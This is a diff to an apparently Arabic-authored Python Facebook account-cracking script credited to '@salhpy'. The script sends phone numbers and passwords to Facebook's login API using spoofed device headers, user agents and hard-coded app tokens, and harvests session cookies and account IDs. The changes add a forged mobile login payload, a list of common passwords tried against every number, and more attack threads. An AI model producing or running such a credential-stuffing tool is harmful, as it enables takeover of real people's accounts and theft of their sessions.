@@ -1104,7 +1104,7 @@ def get_apps(cookie_string):
         print(f"{احمر}خطأ عام في دالة الكوكيز: {e}{اعادة}")
 
 def u():
-    u = ([
+	u = ([
 "[FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/117696129;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/320384521]",
 "[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/428128336;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/502737047]",
 "[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/550431893;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/365327474]",
@@ -1295,29 +1295,61 @@ def u():
 "[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/612546532;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/149601111]",
 "[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/620903684;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/439619246]",
 "[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/688734853;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/682916595]",
-"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/147054806;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/406709814]"])
+"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/147054806;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/406709814]"
+    ])
     return random.choice(u)
 def chick_Salh(phone, pas):
     global hit, bad, CP, cok, apps, dates, apps2, dates2, cookie_string, idd, iddd
+    sex = random.choice(["Liger", "METERED", "MOBILE.EDGE", "MOBILE.HSPA", "MOBILE.LTE", "MODERATE"])
     current_timestamp = int(time.time())
     pwd_enc = f"#PWD_FB4A:0:{current_timestamp}:{pas}"
-    url = "https://graph.facebook.com/auth/login"
-    
-    payload = {
-      "locale": "ar_AR",
-      "format": "json",
-      "email": phone,
-      "password": pwd_enc,
-      "access_token": "257637621624717|7e73d6961c0c8fab39f62afdfb77f96b",
-      "generate_session_cookies": 1
-    }
-    
+    url = "https://b-graph.facebook.com/auth/login"
+    data = {
+                "adid": str(uuid.uuid4()),
+                "format": "json",
+                "device_id": str(uuid.uuid4()),
+                "cpl": "true",
+                "family_device_id": str(uuid.uuid4()),
+                "credentials_type": "device_based_login_password",
+                "error_detail_type": "button_with_disabled",
+                "source": "register_api",
+                "email": phone,
+                "password": pwd_enc,
+                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+                "generate_session_cookies": "1",
+                "meta_inf_fbmeta": "NO_FILE",
+                "advertiser_id": str(uuid.uuid4()),
+                "currently_logged_in_userid": "0",
+                "locale": "en_PK",
+                "device": "Samsung",
+                "sdk": "Android",
+                "client_country_code": "PK",
+                "method": "auth.login",
+                "fb_api_req_friendly_name": "authenticate",
+                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+                "api_key": "882a8490361da98702bf97a021ddc14d",
+            }
     headers = {
-      'User-Agent': u(),
-      'Accept-Encoding': "gzip",
-      'content-type': "application/json;charset=utf-8",
-    }
-    response = requests.post(url, data=json.dumps(payload), headers=headers).json()
+                "User-Agent": u(),
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Host": "graph.facebook.com",
+                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
+                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
+                "X-FB-Connection-Type":sex,
+                "Authorization": "OAuth 6628568379|c1e620fa708a1d5696fb991c1bde5662",
+                "X-FB-Connection-Quality": sex,
+                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
+                "X-Tigon-Is-Retry": "False",
+                "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
+                "x-fb-device-group": "5120",
+                "X-FB-Friendly-Name": "ViewerReactionsMutation",
+                "X-FB-Request-Analytics-Tags": "graphservice",
+                "X-FB-HTTP-Engine": "Liger",
+                "X-FB-Client-IP": "True",
+                "X-FB-Server-Cluster": "True",
+                "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
+            }
+    response = requests.post(url, data=data, headers=headers).json()
     response_str = str(response)
     try:
     	idd = response.get('error', {}).get('error_data', {}).get('uid')
@@ -1393,16 +1425,18 @@ Developer • @salhpy
 
     else:
         bad += 1
-        sys.stdout.write(اعادة + f'\r{احمر}BAD ACCOUNT | Bad {bad} | CP {CP} | Hit {hit} | {اعادة}{ذهبي} {pas} ~{اعادة}{ازرق} @salhpy')
+        sys.stdout.write(اعادة + f'\r{احمر}BAD ACCOUNT | Bad {bad} | CP {CP} | Hit {hit} | {اعادة}{ازرق} @salhpy')
         sys.stdout.flush()
 tele()
 choose_country()
 def tt():
     while True:
         phone, pas = gin()
-        chick_Salh(phone, pas)
+        passwords = [pas, '123456', '12345678','112233','11223344','qqwweerr','zzxxccvvbbnnmm','20002000','20252025','20242024','20262026']
+        for pwd in passwords:
+            chick_Salh(phone, pwd)
 os.system('clear')
 logn()
-for i in range(3):
+for i in range(5):
     t = threading.Thread(target=tt)
     t.start()
